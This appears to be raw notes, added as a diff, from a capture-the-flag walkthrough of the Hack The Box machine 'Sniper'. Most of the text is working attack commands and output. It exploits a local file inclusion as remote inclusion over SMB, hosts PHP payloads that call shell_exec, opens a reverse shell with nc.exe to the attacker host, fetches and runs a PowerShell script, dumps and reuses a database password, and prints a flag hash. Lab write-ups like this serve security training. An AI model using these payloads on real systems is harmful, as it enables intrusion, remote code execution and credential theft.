@@ -1,0 +1,140 @@
+
+Page http://10.10.10.151/blog/?lang=blog-en.php loads index page if changed to;
+http://10.10.10.151/blog/?lang=index.php
+there is an LFI
+
+RFI+SMB
+goto
+
+http://10.10.10.151/blog/?lang=\\10.10.16.51/what
+
+we got
+
+root@kali:~/HTB/Sniper# nc -lvp 445
+listening on [any] 445 ...
+connect to [10.10.16.51] from sniper.htb [10.10.10.151] 54490
+E�SMBrS�����"NT LM 0.12SMB 2.002SMB 2.???
+
+
+setup smb
+root@kali:~/HTB/Sniper# mkdir /var/www/html/pub
+root@kali:~/HTB/Sniper# cd  /var/www/html/pub
+root@kali:/var/www/html/pub# ls
+root@kali:/var/www/html/pub# chmod 0555  /var/www/html/pub
+root@kali:/var/www/html/pub# chown -R nobody:nogroup  /var/www/html/pub
+root@kali:/var/www/html/pub# ls -ld  /var/www/html/pub
+dr-xr-xr-x 2 nobody nogroup 4096 Oct 13 09:31 /var/www/html/pub
+
+root@kali:/var/www/html/pub# echo > /etc/samba/smb.conf
+
+root@kali:/var/www/html/pub# nano /etc/samba/smb.conf
+root@kali:/var/www/html/pub# cat /etc/samba/smb.conf
+
+[global]
+workgroup = WORKGROUP
+server string = Samba Server %v
+netbios name = indishell-lab
+security = user
+map to guest = bad user
+name resolve order = bcast host
+dns proxy = no
+bind interfaces only = yes
+
+[ica]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+
+root@kali:~/HTB/Sniper# smbclient -L //10.10.16.31
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ica             Disk      
+	IPC$            IPC       IPC Service (Samba Server 4.8.5-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+
+
+
+root@kali:/var/www/html/pub# cat ping.php
+<?php
+shell_exec("ping 10.10.16.31");
+?>
+
+goto http://10.10.10.151/blog/?lang=\\10.10.16.31\ica\ping.php
+root@kali:~/HTB/Sniper# tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+12:30:35.659008 IP 10.10.10.151 > 10.10.16.31: ICMP echo request, id 1, seq 38, length 40
+12:30:35.659036 IP 10.10.16.31 > 10.10.10.151: ICMP echo reply, id 1, seq 38, length 40
+12:30:36.613900 IP 10.10.10.151 > 10.10.16.31: ICMP echo request, id 1, seq 39, length 40
+12:30:36.613941 IP 10.10.16.31 > 10.10.10.151: ICMP echo reply, id 1, seq 39, length 40
+12:30:37.635751 IP 10.10.10.151 > 10.10.16.31: ICMP echo request, id 1, seq 40, length 40
+12:30:37.635786 IP 10.10.16.31 > 10.10.10.151: ICMP echo reply, id 1, seq 40, length 40
+
+
+transfer nc.exe to box
+
+http://10.10.10.151/blog/?lang=\\10.10.16.31\ica\nc.exe
+
+root@kali:/var/www/html/pub# cat test.php
+<?php
+$output = shell_exec("dir C:\\Temp");
+echo "<pre>$output</pre>";
+?>
+
+
+root@kali:/var/www/html/pub# nano test2.php
+root@kali:/var/www/html/pub# cat test2.php
+<?php
+$output = shell_exec("C:\\Temp\\nc.exe 10.10.16.31 1337");
+echo "<pre>$output</pre>";
+?>
+
+
+root@kali:~/HTB/Sniper/www# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.31] from sniper.htb [10.10.10.151] 51944
+
+C:\inetpub\wwwroot\user>type db.php
+type db.php
+<?php
+// Enter your Host, username, password, database below.
+// I left password empty because i do not set password on localhost.
+$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  }
+?>
+
+
+root@kali:~/HTB/Sniper# smbmap -u chris -p 36mEAhz/B8xQ~2VM -H 10.10.10.151
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.151...
+[+] IP: 10.10.10.151:445	Name: sniper.htb                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	READ ONLY
+
+C:\inetpub\wwwroot\user>powershell wget http://10.10.16.31/getflag.ps1 -O C:\Temp\ff.ps1
+powershell wget http://10.10.16.31/getflag.ps1 -O C:\Temp\ff.ps1
+
+C:\inetpub\wwwroot\user>powershell C:\Temp\ff.ps1
+powershell C:\Temp\ff.ps1
+21f4d0f29fc4dd867500c1ad716cf56e
+
+
